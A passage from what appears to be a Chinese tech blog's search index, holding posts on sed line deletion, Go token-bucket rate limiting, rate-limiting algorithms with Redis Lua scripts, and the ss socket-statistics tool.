class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除第2行</span></span><br><span class="line">sed <span class="string">'2d'</span> filename</span><br><span class="line"><span class="comment"># 删除1-4行</span></span><br><span class="line">sed <span class="string">'1,4d'</span> filename</span><br><span class="line"><span class="comment"># 删除1行和后2行,共3行</span></span><br><span class="line">sed <span class="string">'1,+2d'</span> filename</span><br><span class="line"><span class="comment"># 删除匹配到Coder的行和其后面的2行</span></span><br><span class="line">sed <span class="string">'/Coder/,+2d'</span> filename</span><br><span class="line"><span class="comment"># 删除奇数行</span></span><br><span class="line">sed <span class="string">'1~2d'</span> filename</span><br><span class="line"><span class="comment"># 删除偶数行</span></span><br><span class="line">sed <span class="string">'2~2d'</span> filename</span><br><span class="line"><span class="comment"># 删除匹配Coder的行</span></span><br><span class="line">sed <span class="string">'/Coder/d'</span> filename</span><br><span class="line"><span class="comment"># 删除所有空行</span></span><br><span class="line">sed <span class="string">'/^$/d'</span> filename</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>令牌桶</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E4%BB%A4%E7%89%8C%E6%A1%B6/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E4%BB%A4%E7%89%8C%E6%A1%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol><li>以v的速度向桶内放置令牌，桶的容量为b，如果桶满了多余令牌就会被丢弃。</li><li>请求到达时，我们向桶内获取令牌，如果令牌足够，则请求通过。</li><li>如果桶内令牌不够，则这个请求会被缓存等待令牌足够是转发，或者被直接丢掉。</li><li>桶的容量b，可以应对突发的流量。</li></ol><h3 id="rate库"><a href="#rate库" class="headerlink" title="rate库"></a>rate库</h3><ol><li><p>基本结构体</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Limit <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Limiter <span class="keyword">struct</span> {</span><br><span class="line">limit     Limit      <span class="comment">// 每秒放入的令牌数量</span></span><br><span class="line">burst     <span class="type">int</span>        <span class="comment">// 桶大小</span></span><br><span class="line">mu        sync.Mutex <span class="comment">// 锁</span></span><br><span class="line">tokens    <span class="type">float64</span>    <span class="comment">// 剩余令牌数量</span></span><br><span class="line">last      time.Time  <span class="comment">// 上一次取走tokens的时间</span></span><br><span class="line">lastEvent time.Time  <span class="comment">// 最近限流事件的时间</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 令牌发放之后，会存储在 Reservation 预约对象中</span></span><br><span class="line"><span class="keyword">type</span> Reservation <span class="keyword">struct</span> {</span><br><span class="line">ok        <span class="type">bool</span>      <span class="comment">// 是否满足条件分配了token</span></span><br><span class="line">lim       *Limiter  <span class="comment">// 发送令牌的限流器</span></span><br><span class="line">tokens    <span class="type">int</span>       <span class="comment">// 发送 token 令牌的数量</span></span><br><span class="line">timeToAct time.Time <span class="comment">// 满足令牌发放的时间</span></span><br><span class="line">limit     Limit     <span class="comment">// 令牌发放速度</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>方法</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构建一个限流器，r 是每秒放入的令牌数量，b 是桶的大小</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewLimiter</span><span class="params">(r Limit, b <span class="type">int</span>)</span></span> *Limiter</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别返回 b 和 r 的值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Burst() <span class="type">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Limit() Limit</span><br><span class="line"></span><br><span class="line"><span class="comment">// token 3种消费方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Allow() <span class="type">bool</span> <span class="comment">// Allow(now, 1)</span></span><br><span class="line"><span class="comment">// 表示截止到now这个时间点，是否存在n个token</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> AllowN(now time.Time, n <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Reserve() *Reservation <span class="comment">// ReserveN(now, 1)</span></span><br><span class="line"><span class="comment">// ReserveN和AllowN类似，表示截止到now这个时间点，是否存在n个token，无论Token是否充足，都会返回Reservation对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> ReserveN(now time.Time, n <span class="type">int</span>) *Reservation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Wait(ctx context.Context) (err <span class="type">error</span>) <span class="comment">// WaitN(ctx, 1)</span></span><br><span class="line"><span class="comment">// 如果存在n个令牌就直接转发，不存在就阻塞，直至满足条件，传入的ctx的Deadline就是等待的Deadline</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> WaitN(ctx context.Context, n <span class="type">int</span>) (err <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态流控</span></span><br><span class="line"><span class="comment">// 设置桶的大小</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetBurst(newBurst <span class="type">int</span>)</span><br><span class="line"><span class="comment">// 流控最后的更新时间</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetBurstAt(now time.Time, newBurst <span class="type">int</span>)</span><br><span class="line"><span class="comment">// token 生产速率</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetLimit(newLimit Limit)</span><br><span class="line"><span class="comment">// 流控最后的更新时间</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetLimitAt(now time.Time, newLimit Limit)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果不想等待，可以调用Cancel()方法，该方法会将Token归还。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reservation)</span></span> Cancel()</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reservation)</span></span> CancelAt(now time.Time)</span><br><span class="line"><span class="comment">// 返回需要等待的时间。如果等待时间为0，则说明不用等待</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reservation)</span></span> Delay() time.Duration</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reservation)</span></span> DelayFrom(now time.Time) time.Duration</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Reservation)</span></span> OK() <span class="type">bool</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>使用</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对ip进行限流</span></span><br><span class="line"><span class="keyword">var</span> limiters = &amp;sync.Map{}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rateLimiter</span><span class="params">(r rate.Limit, b <span class="type">int</span>, ip <span class="type">string</span>, t time.Duration)</span></span> <span class="type">bool</span> {</span><br><span class="line">l, _ := limiters.LoadOrStore(ip, rate.NewLimiter(r, b))</span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), t)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := l.(*rate.Limiter).Wait(ctx); err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>限流器</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%99%90%E6%B5%81%E5%99%A8/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-19-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%99%90%E6%B5%81%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81">系统自适应限流</a></p><p><a href="https://juejin.cn/post/7075137592265539614">5种限流算法，7种限流方式，挡住突发流量</a></p><h4 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h4><p>通过对一个时间窗口内的请求量进行限制来保障系统的正常运行。如果我们的服务资源有限、处理能力有限，就需要对调用我们服务的上游请求进行限制，以防止自身服务由于资源耗尽而停止服务。</p><blockquote><p>阈值：在一个单位时间内允许的请求量。</p><p>拒绝策略：超过阈值的请求的拒绝策略，常见的拒绝策略有直接拒绝、排队等。</p></blockquote><h4 id="常见限流算法-静态"><a href="#常见限流算法-静态" class="headerlink" title="常见限流算法(静态)"></a>常见限流算法(静态)</h4><h5 id="1-固定窗口算法"><a href="#1-固定窗口算法" class="headerlink" title="1.固定窗口算法"></a>1.固定窗口算法</h5><p>固定窗口算法又叫计数器算法，是一种简单方便的限流算法。主要通过一个支持原子操作的计数器来累计1秒内的请求次数，当一秒内计数达到限流阈值时触发拒绝策略。每过1秒，计数器重置为0。</p><h5 id="2-滑动窗口算法"><a href="#2-滑动窗口算法" class="headerlink" title="2.滑动窗口算法"></a>2.滑动窗口算法</h5><p>滑动窗口是对固定窗口算法的改进。在一个窗口内分段，不能从根本上解决时间窗口的临界突变问题。</p><h5 id="3-滑动日志算法"><a href="#3-滑动日志算法" class="headerlink" title="3.滑动日志算法"></a>3.滑动日志算法</h5><p>记录下所有的请求时间点，新请求到来时先判断最近置顶时间范围内的请求数量是否超过指定阈值，由此来确定是否达到限流，这种方式没有了时间窗口突变的问题，限流比较准确，但是因为要记录每次请求的时间点，所以占用的内存较多。</p><h5 id="4-漏桶算法"><a href="#4-漏桶算法" class="headerlink" title="4.漏桶算法"></a>4.漏桶算法</h5><p>漏桶算法中的漏桶是一个形象的比喻，这里可以用生产者消费者模式进行说明，请求是一个生产者，每一个请求都如一滴水，请求到来后放到一个队列（漏桶）中，桶底有一个孔，不断漏出水滴，如消费者在消费队列中的内容，消费的速率（漏出的速度）等于限流阈值。漏桶的大小，就如队列的容量，当请求堆积超过指定容量时，会触发拒绝策略。</p><h5 id="5-令牌桶算法"><a href="#5-令牌桶算法" class="headerlink" title="5.令牌桶算法"></a>5.令牌桶算法</h5><p>令牌桶的实现思路类似于生产者和消费者的关系。系统服务作为生产者，按照指定频率向桶中添加令牌，如果桶中令牌数量达到阈值，则不在添加。请求执行作为消费者，每个请求都需要去桶中拿取一个令牌，取到令牌则继续执行，如果桶中无令牌可取，则触发拒绝策略，可以是超时等待，也可以直接拒绝本次请求。</p><ul><li><p>Todo 令牌生成算法</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 限流器结构体</span></span><br><span class="line"><span class="keyword">type</span> Limiter</span><br><span class="line"><span class="comment">// 构建一个限流器，r 是每秒放入的令牌数量，b 是桶的大小</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">NewLimiter</span><span class="params">(r Limit, b <span class="type">int</span>)</span></span> *Limiter</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别返回 b 和 r 的值</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Burst() <span class="type">int</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Limit() Limit</span><br><span class="line"></span><br><span class="line"><span class="comment">// token 消费方法</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Allow() <span class="type">bool</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> AllowN(now time.Time, n <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Reserve() *Reservation</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> ReserveN(now time.Time, n <span class="type">int</span>) *Reservation</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> Wait(ctx context.Context) (err <span class="type">error</span>)</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> WaitN(ctx context.Context, n <span class="type">int</span>) (err <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态流控</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetBurst(newBurst <span class="type">int</span>)</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetBurstAt(now time.Time, newBurst <span class="type">int</span>)</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetLimit(newLimit Limit)</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(lim *Limiter)</span></span> SetLimitAt(now time.Time, newLimit Limit)</span><br></pre></td></tr></tbody></table></figure></li></ul><h5 id="6-Redis分布式限流"><a href="#6-Redis分布式限流" class="headerlink" title="6.Redis分布式限流"></a>6.Redis分布式限流</h5><p>Redis单线程，内存操作，速度快</p><ol><li><p>固定窗口限流：使用incr命令实现，使用时间戳为key。使用lua保证incr和expire是原子操作。</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> count = redis.call(<span class="string">"incr"</span>,KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">  redis.call(<span class="string">'expire'</span>,KEYS[<span class="number">1</span>],ARGV[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> count &gt; <span class="built_in">tonumber</span>(ARGV[<span class="number">1</span>]) <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>滑动窗口限流：zset有序集合实现滑动窗口。lua保证原子性。</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--KEYS[1]: 限流 key</span></span><br><span class="line"><span class="comment">--ARGV[1]: 时间戳 - 时间窗口</span></span><br><span class="line"><span class="comment">--ARGV[2]: 当前时间戳（作为score）</span></span><br><span class="line"><span class="comment">--ARGV[3]: 阈值</span></span><br><span class="line"><span class="comment">--ARGV[4]: score 对应的唯一value</span></span><br><span class="line"><span class="comment">-- 1. 移除时间窗口之前的数据</span></span><br><span class="line">redis.call(<span class="string">'zremrangeByScore'</span>, KEYS[<span class="number">1</span>], <span class="number">0</span>, ARGV[<span class="number">1</span>])</span><br><span class="line"><span class="comment">-- 2. 统计当前元素数量</span></span><br><span class="line"><span class="keyword">local</span> res = redis.call(<span class="string">'zcard'</span>, KEYS[<span class="number">1</span>])</span><br><span class="line"><span class="comment">-- 3. 是否超过阈值</span></span><br><span class="line"><span class="keyword">if</span> (res == <span class="literal">nil</span>) <span class="keyword">or</span> (res &lt; <span class="built_in">tonumber</span>(ARGV[<span class="number">3</span>])) <span class="keyword">then</span></span><br><span class="line">    redis.call(<span class="string">'zadd'</span>, KEYS[<span class="number">1</span>], ARGV[<span class="number">2</span>], ARGV[<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-网络状态工具ss</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E5%B7%A5%E5%85%B7ss/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E5%B7%A5%E5%85%B7ss/</url>
      
        <content type="html"><![CDATA[<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p><strong>ss命令</strong> 用来显示处于活动状态的套接字信息。ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss [参数]</span><br><span class="line">ss [参数] [过滤]</span><br></pre></td></tr></tbody></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-h, --help      帮助信息</span><br><span class="line">-V, --version   程序版本信息</span><br><span class="line">-n, --numeric   不解析服务名称</span><br><span class="line">-r, --resolve   解析主机名</span><br><span class="line">-a, --all       显示所有套接字（sockets）</span><br><span class="line">-l, --listening 显示监听状态的套接字（sockets）</span><br><span class="line">-o, --options   显示计时器信息</span><br><span class="line">-e, --extended  显示详细的套接字（sockets）信息</span><br><span class="line">-m, --memory    显示套接字（socket）的内存使用情况</span><br><span class="line">-p, --processes 显示使用套接字（socket）的进程</span><br><span class="line">-i, --info      显示 TCP内部信息</span><br><span class="line">-s, --summary   显示套接字（socket）使用概况</span><br><span class="line">-4, --ipv4      仅显示IPv4的套接字（sockets）</span><br><span class="line">-6, --ipv6      仅显示IPv6的套接字（sockets）</span><br><span class="line">-0, --packet    显示 PACKET 套接字（socket）</span><br><span class="line">-t, --tcp       仅显示 TCP套接字（sockets）</span><br><span class="line">-u, --udp       仅显示 UCP套接字（sockets）</span><br><span class="line">-d, --dccp      仅显示 DCCP套接字（sockets）</span><br><span class="line">-w, --raw       仅显示 RAW套接字（sockets）</span><br><span class="line">-x, --unix      仅显示 Unix套接字（sockets）</span><br><span class="line">-f, --family=FAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink</span><br><span class="line">-A, --query=QUERY, --socket=QUERY</span><br><span class="line">      QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY]</span><br><span class="line">-D, --diag=FILE     将原始TCP套接字（sockets）信息转储到文件</span><br><span class="line"> -F, --filter=FILE  从文件中都去过滤器信息</span><br><span class="line">       FILTER := [ state TCP-STATE ] [ EXPRESSION ]</span><br></pre></td></tr></tbody></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ss -t -a    # 显示TCP连接</span><br><span class="line">ss -s       # 显示 Sockets 摘要</span><br><span class="line">ss -l       # 列出所有打开的网络连接端口</span><br><span class="line">ss -pl      # 查看进程使用的socket</span><br><span class="line">ss -lp | grep 3306  # 找出打开套接字/端口应用程序</span><br><span class="line">ss -u -a    显示所有UDP Sockets</span><br><span class="line">ss -o state established '( dport = :smtp or sport = :smtp )' # 显示所有状态为established的SMTP连接</span><br><span class="line">ss -o state established '( dport = :http or sport = :http )' # 显示所有状态为Established的HTTP连接</span><br><span class="line">ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24  # 列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss 和 netstat 效率对比</span></span><br><span class="line">time netstat -at</span><br><span class="line">time ss</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配远程地址和端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss dst ADDRESS_PATTERN</span></span><br><span class="line">ss dst 192.168.1.5</span><br><span class="line">ss dst 192.168.119.113:http</span><br><span class="line">ss dst 192.168.119.113:smtp</span><br><span class="line">ss dst 192.168.119.113:443</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配本地地址和端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss src ADDRESS_PATTERN</span></span><br><span class="line">ss src 192.168.119.103</span><br><span class="line">ss src 192.168.119.103:http</span><br><span class="line">ss src 192.168.119.103:80</span><br><span class="line">ss src 192.168.119.103:smtp</span><br><span class="line">ss src 192.168.119.103:25</span><br></pre></td></tr></tbody></table></figure><p><strong>将本地或者远程端口和一个数比较</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss dport OP PORT 远程端口和一个数比较；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss sport OP PORT 本地端口和一个数比较</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">OP 可以代表以下任意一个:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt;= or le : 小于或等于端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt;= or ge : 大于或等于端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">== or eq : 等于端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">!= or ne : 不等于端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&lt; or gt : 小于端口号</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&gt; or lt : 大于端口号</span></span><br><span class="line">ss  sport = :http</span><br><span class="line">ss  dport = :http</span><br><span class="line">ss  dport \&gt; :1024</span><br><span class="line">ss  sport \&gt; :1024</span><br><span class="line">ss sport \&lt; :32000</span><br><span class="line">ss  sport eq :22</span><br><span class="line">ss  dport != :22</span><br><span class="line">ss  state connected sport = :http</span><br><span class="line">ss \( sport = :http or sport = :https \)</span><br><span class="line">ss -o state fin-wait-1 \( sport = :http or sport = :https \) dst 192.168.1/24</span><br></pre></td></tr></tbody></table></figure><p><strong>用TCP 状态过滤Sockets</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ss -4 state closing</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss -4 state FILTER-NAME-HERE</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ss -6 state FILTER-NAME-HERE</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">FILTER-NAME-HERE 可以代表以下任何一个：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">all : 所有以上状态</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">connected : 除了listen and closed的所有状态</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">synchronized :所有已连接的状态除了syn-sent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">big : 